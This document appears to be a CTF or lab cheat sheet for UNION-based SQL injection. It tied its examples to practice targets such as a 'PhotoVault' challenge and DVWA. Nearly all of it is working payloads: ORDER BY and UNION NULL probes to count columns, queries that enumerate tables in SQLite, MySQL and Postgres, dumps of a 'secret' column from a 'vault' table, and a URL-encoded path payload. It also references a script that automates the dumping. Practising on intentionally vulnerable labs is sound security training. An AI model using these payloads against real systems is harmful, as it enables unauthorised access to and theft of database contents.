# UNION-based SQLi (results rendered)

**Signs**: query results appear on the page (list, detail view, table). Hint "count the columns".

## 1. Number of columns
```
' ORDER BY 1-- ,  ' ORDER BY 2-- , ...           error at N+1 ⇒ N columns
' UNION SELECT NULL-- , ' UNION SELECT NULL,NULL-- , ...   works at N
```
Numeric context (no quote): `0 UNION SELECT 1,2,3,4--`.

## 2. Make your row the one shown
Make the original return nothing (`id=0`, `id=-1`, `q=zzzz'`), then UNION your row. See which
columns are displayed: `0 UNION SELECT 'c1','c2','c3','c4'--`.

## 3. Enumerate & dump
```sql
-- SQLite
0 UNION SELECT 1,name,3,sql FROM sqlite_master WHERE type='table'--
0 UNION SELECT 1,item,3,secret FROM vault--
-- MySQL
0 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='vault'-- -
0 UNION SELECT 1,group_concat(secret SEPARATOR ' | '),3,4 FROM vault-- -
-- Postgres
0 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema='public'--
```
Only one row shown? Concatenate (`group_concat`, `string_agg`, SQLite `group_concat`) or page with
`LIMIT 1 OFFSET n`. Type errors (Postgres/MSSQL)? Use `NULL` and cast: `CAST(x AS text)`.

## 4. In a URL path
`/photo/0 UNION SELECT 1,item,3,secret FROM vault--` → URL-encode spaces/commas:
`/photo/0%20UNION%20SELECT%201%2Citem%2C3%2Csecret%20FROM%20vault--`.

Script: `python scripts/sqli/union_dump.py "$T/photo/{}" --cols 4` (finds column count + visible
column, lists tables, dumps).

Seen in: `sqli3` (PhotoVault: `/photo/<id>` 4 columns, `vault` table), DVWA "SQL Injection".
